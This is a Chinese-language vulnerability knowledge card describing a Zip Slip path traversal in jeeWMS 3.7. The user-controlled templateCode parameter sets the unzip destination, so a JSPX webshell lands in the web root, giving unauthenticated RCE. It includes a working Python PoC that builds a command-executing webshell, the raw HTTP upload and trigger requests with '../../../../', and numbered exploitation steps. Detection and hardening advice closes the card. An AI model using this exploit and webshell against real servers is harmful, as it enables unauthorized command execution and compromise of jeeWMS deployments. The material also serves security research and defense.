---
id: web-generic-file-upload-jeewms-cgformtemplate-zipslip-templatecode
title: jeeWMS CgformTemplateController 用 templateCode 控制解压目标目录导致 Zip Slip 写 JSPX
type: scenario
domain: web
path: web/generic/file-upload
technique: zip-slip-via-destination-directory
aliases:
- jeeWMS 模板上传解压 RCE
- CgformTemplateController 穿越
- templateCode 路径穿越
- jeeWMS Zip Slip
- uploadZip/doAdd
tags:
- jeewms
- java
- zip-slip
- path-traversal
- arbitrary-write
- webshell
- jspx
- rce
cve: []
severity: critical
confidence: high
status: verified
affected_versions: jeeWMS 3.7（原文复现 commit 580e924afed5a...）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V39
  verified_at: '2026-11-05T06:28:04+08:00'
  notes: 已对照原文与43张图核对：uploadZip 存 WEB-INF/classes/online/template/temp 并回显 zip_ 文件名（图35/36/40）、doAdd 用 templateCode 拼 templateDir 且 removeZipFile 解压（图37/38）、ZipUtil.unzip 用 new File(destDir, entryName)（图39）、templateCode=../../../../ 后 file 解析到 webapps/jeewms/shell.jspx（图42）、访问返回 RCE_OK root（图43）。未验证点：PoC 未本机复跑；doUpdate 原文声明未验证，卡内已注明。原文明确版本 3.7，affected_versions 保留；frontmatter 无 sources/source_url。
---

## 一句话结论

jeeWMS 的模板上传 `uploadZip` 会把 zip 存到 `WEB-INF/classes/online/template/temp/` 并回显文件名，`doAdd` 随后用用户可控的 `templateCode` 直接拼成解压目标目录 `basePath/templateCode`，再调用 `ZipUtil.unzip`；由于 `new File(destDir, entryName)` 不校验边界，`templateCode=../../../../` 可把压缩包内的 `shell.jspx` 解压到 Web 应用根目录，实现未授权 RCE。

## 原理

- `CgformTemplateController.uploadZip()` 接收 multipart 压缩包，`tempDir = new File(getUploadBasePath(request), "temp")`，实际调试值为 `/usr/local/tomcat/webapps/jeewms/WEB-INF/classes/online/template/temp`；文件被保存为 `zip_<sessionId>.<原扩展名>`，并通过 `j.setObj(picTempFile.getName())` 回显文件名。
- `doAdd()` 接收 `CgformTemplateEntity`，其中 `templateCode` 由用户传入；代码执行 `basePath = getUploadBasePath(request)`、`File templateDir = new File(basePath + File.separator + cgformTemplate.getTemplateCode())`。`templateCode` 没有任何字符或路径校验，`../../../../` 会逃出模板目录。
- 随后 `removeZipFile(basePath + "/temp/" + templateZipName, templateDir.getAbsolutePath())`，`templateZipName` 也可由用户指定（用上一步回显的文件名），把攻击者上传的 zip 作为解压源。
- `ZipUtil.unzip` 的核心是 `new File(destDir, entryName)`：`destDir` 已是穿越后的目录，`entryName` 来自 zip 条目，同样未过滤；只要 zip 内包含 `shell.jspx`，最终路径就落在 Web 根下。
- 整个链只需要模板上传/解压功能可达，且可通过 jeeWMS 的鉴权绕过（`rest/cgformTemplateController` 或 `.do?wmsApiController.do`）未授权调用。

## 触发条件

- jeeWMS 3.7，`CgformTemplateController` 的 `uploadZip`/`doAdd` 可访问。
- 鉴权绕过可用，或攻击者已有低权限后台会话。
- 进程对 `WEB-INF/classes/online/template` 与穿越后的 Web 根目录有写权限。
- Tomcat 解析 `.jspx`（默认 JSP Servlet 支持）或解压到其它可执行/可加载位置。

## 利用步骤

1. 制作包含 `shell.jspx` 的 zip（条目名直接用 `shell.jspx`，不需要在条目名里写 `../`）。
2. `POST /jeewms/rest/cgformTemplateController`，体含 `uploadZip=1`，multipart 文件字段 `file` 上传 `1.zip`；从响应 `obj` 取得 `zip_<sessionid>.zip` 文件名。
3. `POST /jeewms/rest/cgformTemplateController`，体含 `doAdd=1`、`templateCode=../../../../`、`templateZipName=<上一步文件名>`。
4. 解压后 `shell.jspx` 落在 `webapps/jeewms/shell.jspx`（具体层数按部署调整）。
5. 访问 `/jeewms/shell.jspx?cmd=whoami` 验证命令执行。
6. 清理上传的 zip、解压文件与模板记录（授权测试）。

## PoC

生成 zip（条目名无需穿越）：

```python
import zipfile
with zipfile.ZipFile('shell.zip', 'w') as z:
    z.writestr('shell.jspx', '''<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
<jsp:directive.page import="java.io.*" contentType="text/plain;charset=UTF-8"/>
<jsp:scriptlet>
out.println("RCE_OK");
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
    BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String l; while ((l = r.readLine()) != null) out.println(l);
}
</jsp:scriptlet>
</jsp:root>''')
```

上传：

```http
POST /jeewms/rest/cgformTemplateController HTTP/1.1
Host: target:8081
Content-Type: multipart/form-data; boundary=----X

------X
Content-Disposition: form-data; name="uploadZip"

1
------X
Content-Disposition: form-data; name="file"; filename="1.zip"
Content-Type: application/zip

<zip bytes>
------X--
```

触发解压：

```http
POST /jeewms/rest/cgformTemplateController HTTP/1.1
Host: target:8081
Content-Type: application/x-www-form-urlencoded

doAdd=1&templateCode=../../../../&templateZipName=zip_<sessionId>.zip
```

## 变体与关联

- 注入点变体：常见 Zip Slip 穿越在 `entryName`；本例穿越在 `destDir`（`templateCode`），说明只校验条目名不足以修复。
- 层数变体：`templateCode` 的 `../` 层数按 `basePath` 与 Web 根的实际相对深度调整；也可用绝对路径（若 `File` 拼接允许）。
- 文件名变体：`templateZipName` 直接控制解压源；若可指向其它 zip（如上传目录中的他人文件），可扩大影响。
- 关联卡片：[[web-generic-file-upload-zip-slip-webshell-write]]（条目名穿越的通用 Zip Slip）、[[web-generic-auth-jeewms-authinterceptor-whitelist-regex-contains-bypass]]、[[web-generic-file-upload-jeewms-cgupload-extension-upload]]。
- 关联：`doUpdate` 可能复用同一解压逻辑，但原文未验证，未单独建卡。

## 检测与防御

- 检测：`doAdd` 的 `templateCode` 含 `..`、`/`、`\`、绝对路径；`templateZipName` 不是服务端生成的白名单名；上传后紧跟解压请求。
- 检测：`WEB-INF/classes/online/template` 之外出现新解压文件；Web 根目录出现 `.jspx/.jsp/.jspf`；zip 条目名含 `..`、绝对路径或脚本后缀。
- 防御：`templateCode` 只允许 `[A-Za-z0-9_-]+`，禁止路径分隔符与 `..`；解压目标目录必须位于固定模板根之下，`resolve()` 后校验 `startsWith`。
- 防御：解压时逐条目规范化并校验边界，拒绝绝对路径、`..`、符号链接；只允许白名单后缀；解压到 Web 根之外且禁止脚本解析。
- 加固：修复鉴权绕过；模板管理功能要求管理员权限；限制上传 zip 大小与条目数。
- 响应：删除恶意解压文件与 zip、清理模板记录、审计上传/解压请求与 Web 访问日志。
